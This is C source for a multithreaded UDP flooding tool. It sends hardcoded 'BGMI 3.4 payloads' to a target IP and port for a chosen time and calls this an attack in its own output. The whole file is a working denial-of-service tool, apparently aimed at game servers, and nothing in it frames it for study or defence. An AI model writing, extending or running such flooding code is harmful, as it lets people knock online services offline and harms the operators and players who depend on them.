#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

// Define the number of threads
#define NUM_THREADS 5 // Change this value to adjust the number of threads

// Function to display usage information
void usage() {
    printf("Usage: ./packet_sender ip port time\n");
    exit(1);
}

// Structure to pass data to each thread
struct thread_data {
    char *ip;
    int port;
    int time;
};

// Function that each thread will execute to send packets
void *send_packets(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    
    // New more powerful BGMI 3.4 payloads (hexadecimal format)
    unsigned char powerful_payloads[][16] = {
        "\x45\x77\x12\x4a\x9b\x72\xfa\x23\x5e\xab\x99\x67\x4f\xcd\xba\x00",
        "\xa1\x90\x58\x3d\xc4\xab\x55\x6f\x82\xe2\x77\x89\xda\x33\x99\x00",
        "\x21\x34\x9d\x87\xf1\x6a\xbc\x56\x23\x8f\x43\xaa\xcd\x19\xef\x00",
        "\x67\x5f\x3b\x1a\x42\xcf\x84\x9d\x7a\x12\x65\xe8\x34\xfe\x00\x00",
    };

    // Number of payloads in each array    
    int num_powerful_payloads = sizeof(powerful_payloads) / sizeof(powerful_payloads[0]);

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Calculate end time for the thread
    endtime = time(NULL) + data->time;

    // Keep sending packets until the specified time expires
    while (time(NULL) <= endtime) {
        // Send existing BGMI 3.4 payloads
        
        // Send new powerful BGMI 3.4 payloads
        for (int i = 0; i < num_powerful_payloads; i++) {
            if (sendto(sock, powerful_payloads[i], sizeof(powerful_payloads[i]), 0, 
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    // Close the socket after sending is done
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    // Parse the command-line arguments
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);

    // Allocate memory for thread IDs
    pthread_t thread_ids[NUM_THREADS];
    struct thread_data data = {ip, port, time};

    // Print attack information
    printf("Sending packets to %s:%d for %d seconds with %d threads\n", ip, port, time, NUM_THREADS);

    // Create threads for sending packets
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&thread_ids[i], NULL, send_packets, (void *)&data) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Thread %lu created.\n", thread_ids[i]);
    }

    // Wait for all threads to finish
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Print completion message
    printf("Packet sending finished.\n");
    return 0;
}
